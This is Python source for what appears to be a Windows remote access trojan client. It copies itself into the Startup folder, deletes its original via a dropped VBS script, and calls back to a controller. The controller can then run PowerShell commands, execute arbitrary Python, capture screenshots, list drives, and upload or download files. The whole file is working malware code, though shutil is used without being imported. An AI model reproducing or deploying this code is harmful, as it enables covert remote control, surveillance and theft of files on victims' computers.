import socket, subprocess, os, time, platform, sys, urllib.request, re, pyautogui
from io import StringIO # Purpose: Python Interpreter (receiving output)

# Socket Properties
HOST = ""
PORT = 10000
buffer = 0x400

# Defines shorter/simpler (Send & Recv) Functions for use
send = lambda data: objSocket.send(data)
recv = lambda buffer: objSocket.recv(buffer)

# Client Properties
appdata = os.environ["APPDATA"]
username = os.getlogin()
system = platform.system() + " " + platform.release()
filename = __file__.split(".")[0] + ".exe"
Startup_Path = f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{filename}"

try:
    Public_IP = urllib.request.urlopen("https://ident.me", timeout=30).read()
except (urllib.error.URLError, Exception):
    Public_IP = b"unknown"

# Copy file to Startup folder
try:
    shutil.copyfile(f"{filename}", Startup_Path)
    with open(appdata+"/configure.vbs", "w") as VBS_File:
        VBS_File.write(f"Set del = CreateObject(\"Scripting.FileSystemObject\")\ndel.DeleteFile(\"{os.getcwd() + '/' + filename}\")")

    subprocess.Popen(Startup_Path, shell=True); subprocess.Popen(appdata+"/configure.vbs", shell=True)
    sys.exit(0)

except (FileNotFoundError, Exception):
    pass

# Connect to Server
def main():
    global objSocket, DecryptionKey

    while (True):
        try:
            objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            objSocket.connect((HOST, PORT))
        except:
            continue
        else:
            break

    send(objSocket.getsockname()[0].encode() + b" " + socket.gethostname().encode() + b" " + username.encode() + \
         b" " + system.encode() + b" " + Public_IP)

main()

# Receive Large Amounts of Data
def recvall(buffer):
    data = b""
    while (len(data) < buffer):
        data += recv(buffer)
    return data

# Deletes all Server Spawned files
def ClearFiles():
    if (os.path.isfile(appdata+"/msg.vbs")):
        os.remove(appdata+"/msg.vbs")
    else: pass

    if (os.path.isfile(appdata+"/screenshot.png")):
        os.remove(appdata+"/screenshot.png")
    else: pass

    if (os.path.isfile(appdata+"/configure.vbs")):
        os.remove(appdata+"/configure.vbs")
    else: pass

def MessageBox(message):
    with open(appdata+"/msg.vbs", "w") as VBS_MsgBox:
        VBS_MsgBox.write(f"MsgBox \"{message}\", 48, \"[Message]\""); VBS_MsgBox.close()

    subprocess.Popen(appdata+"/msg.vbs", shell=True)
    send(b"(Message Sent)")

def Screenshot():
    try:
        pyautogui.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(0.3); send(str(os.path.getsize(appdata+"/screenshot.png")).encode()); time.sleep(0.3)
        with open(appdata+"/screenshot.png", "rb") as ImageFile:
            send(ImageFile.read())
    except Exception as ScreenshotError:
        send(bytes(str(ScreenshotError), "utf-8"))

def PythonInterpreter():
    ServerCode = recv(buffer).decode()
    Redirected_Output = sys.stdout = StringIO()

    try:
        exec(ServerCode); send(b"SUCCESS"); time.sleep(0.3); send(Redirected_Output.getvalue().encode())
        if not (re.findall("print", ServerCode)):
            send(b"no-output")

    except SyntaxError as se:
        send(f"Syntax Error: ({se})".encode())
    except NameError as ne:
        send(f"Name Error: ({ne})".encode())
    except TypeError as te:
        send(f"Type Error: ({te})".encode())
    except OSError as oe:
        send(f"OS Error: ({oe})".encode())
    except OverflowError as ofe:
        send(f"Overflow Error: ({ofe})".encode())
    except Exception as e:
        send(f"Error: ({e})".encode())

def RemoteCMD():
    send(bytes(os.getcwd(), "utf-8"))
    while (True):
        ServerCommand = recv(buffer).decode()
        if (ServerCommand == "exit"):
            break

        if (len(ServerCommand) > 0):
            PS_Command = subprocess.Popen(["powershell.exe", ServerCommand], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            CMD_Output = PS_Command.stdout.read() + PS_Command.stderr.read()
        else:
            CMD_Output = b"Error Occured"

        send(bytes(str(len(CMD_Output)), "utf-8")); time.sleep(0.3)
        send(CMD_Output)

def ViewFiles():
    drives = [chr(x) + ":/" for x in range(65,91) if os.path.isdir(chr(x) + ":/")]
    send(" ".join(drives).encode())

    directory = recv(buffer).decode()
    if not (os.path.isdir(directory)):
        send(b"INVALID")
        return

    Number_Of_Files = str(len(os.listdir(directory)))
    buffersize = str(len("\n".join(os.listdir(directory))))
    files = "\n".join(os.listdir(directory))

    send(b"VALID"); time.sleep(0.3); send(Number_Of_Files.encode()); time.sleep(0.3); send(buffersize.encode())
    time.sleep(0.3); send(files.encode())

def SendFile(filepath):
    if not (os.path.isfile(filepath)):
        send(b"error")
        return

    send(b"success"); time.sleep(0.3); send(os.path.basename(filepath).encode()); time.sleep(0.3); send(str(os.path.getsize(filepath)).encode())
    with open(filepath, "rb") as file:
        send(file.read())

def ReceiveFile(filename, buffersize):
    with open(appdata+"/"+filename, "wb") as file:
        file.write(recvall(buffersize))

while (True):
    try:
        ServerCommand = recv(buffer).decode()
        if not ServerCommand:
            objSocket.close(); del(objSocket); main()

        if (ServerCommand == "close-connection"):
            ClearFiles(); objSocket.close(); del(objSocket); break

        elif (ServerCommand == "append-connection"):
            ClearFiles(); objSocket.close(); del(objSocket); main()

        elif (ServerCommand == "message-box"):
            MessageBox(recv(buffer).decode())

        elif (ServerCommand == "capture-screenshot"):
            Screenshot()

        elif (ServerCommand == "python-interpreter"):
            PythonInterpreter()

        elif (ServerCommand == "remote-cmd"):
            RemoteCMD()

        elif (ServerCommand == "current-dir"):
            send(os.getcwd().encode())

        elif (ServerCommand == "view-files"):
            ViewFiles()

        elif (ServerCommand == "receive-file"):
            SendFile(filepath=recv(buffer).decode())

        elif (ServerCommand == "send-file"):
            ReceiveFile(filename=recv(buffer).decode(), buffersize=int(recv(buffer).decode()))

    except:
        ClearFiles(); objSocket.close(); del(objSocket); main()
